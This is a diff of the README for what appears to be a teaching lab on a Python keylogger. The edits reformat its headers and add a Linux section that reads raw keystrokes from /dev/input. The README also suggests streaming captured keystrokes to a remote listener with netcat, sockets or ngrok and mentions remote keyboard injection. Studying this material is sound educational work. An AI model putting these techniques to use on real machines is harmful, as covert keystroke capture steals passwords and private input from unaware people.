@@ -17,17 +17,17 @@ python simple_keylogger.py
 <img src="kl_screenshot.png" width="100%" height="100%" />
 
 ## Extension Activities
-Modify simple_keylogger.py to:
+### Modify simple_keylogger.py
 * Save the output to file.  See 'use as standalone module' in github repo linked below.
 * Stream output remotely or schedule data dumps 
   * Try using sockets or ngrok+flask
 
-Command line extension activities:
+###Command line extension activities:
 * Run in background using '&' and pipe output to file.
 * Try streaming the output with netcat.
   * Server, Keylogger (ex: 10.2.0.5):
   ```
-  python3 kl.py | nc -lkv 7777
+  python3 simple_keylogger.py | nc -lkv 7777
   ```
   ```
   python -m keyboard | nc -lkv 7777
@@ -38,8 +38,17 @@ Command line extension activities:
   ```
 Note:  Remote keyboard injection is also possible with the keyboard module.
 
+###Linux Extension Activities
+Explore the /dev/input folder.  Try:
+```
+ls -al /dev/input/by-id
+sudo cat /dev/input/eventX | hexdump -C
+```
+How can we unpack the hexdump and determine which keys were pressed?  Hint:  See link below.
+  
 ## Helpful Libraries and Links
 
 * [keyboard module](https://github.com/boppreh/keyboard)
 * [netcat man page](https://man7.org/linux/man-pages/man1/ncat.1.html)
 * [ncat by nmap](https://nmap.org/ncat/guide/index.html)
+* [Format of /dev/input/event struct](https://stackoverflow.com/questions/5060710/format-of-dev-input-event)
